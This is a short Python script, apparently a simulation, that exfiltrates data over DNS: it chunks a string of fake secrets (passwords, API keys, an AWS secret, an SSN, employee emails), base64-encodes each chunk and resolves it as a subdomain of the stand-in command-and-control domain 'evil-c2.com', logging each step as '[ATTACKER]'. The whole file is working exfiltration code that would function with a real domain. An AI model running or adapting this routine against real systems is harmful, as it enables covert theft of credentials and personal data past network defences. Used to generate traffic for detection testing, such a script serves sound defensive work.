import socket
import base64
import time
import random


C2_DOMAIN = "evil-c2.com"

SENSITIVE_DATA = "username=admin&password=SuperSecret123&creditcard=4111111111111111&ssn=123-45-6789&internal_api_key=sk-prod-abc123xyz789&db_password=Pr0d@DB#2026&aws_secret=wJalrXUtnFEMI/K7MDENG&employee_records=raj.sharma@helix.com,priya.mehta@helix.com,amit.verdi@helix.com"

def encode_chunk(data):
    return base64.b64encode(data.encode()).decode().rstrip('=')

def split_into_chunks(data, chunk_size=20):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

def simulate_exfiltration(speed="normal"):
    print(f"\n[ATTACKER] Starting DNS exfiltration to {C2_DOMAIN}")
    print(f"[ATTACKER] Data to exfiltrate: {SENSITIVE_DATA}\n")

    chunks = split_into_chunks(SENSITIVE_DATA)

    delays = {
        "fast":   0.1,   
        "normal": 0.5,   
        "slow":   3.0    
    }
    delay = delays.get(speed, 0.5)

    for i, chunk in enumerate(chunks):
        encoded = encode_chunk(chunk)
        subdomain = f"{encoded}.{C2_DOMAIN}"

        try:
            
            socket.gethostbyname(subdomain)
        except:
           
            pass

        print(f"[ATTACKER] Chunk {i+1}/{len(chunks)} sent: {subdomain}")
        time.sleep(delay)

    print(f"\n[ATTACKER] Exfiltration complete — {len(chunks)} chunks sent")

if __name__ == "__main__":
    simulate_exfiltration(speed="fast")
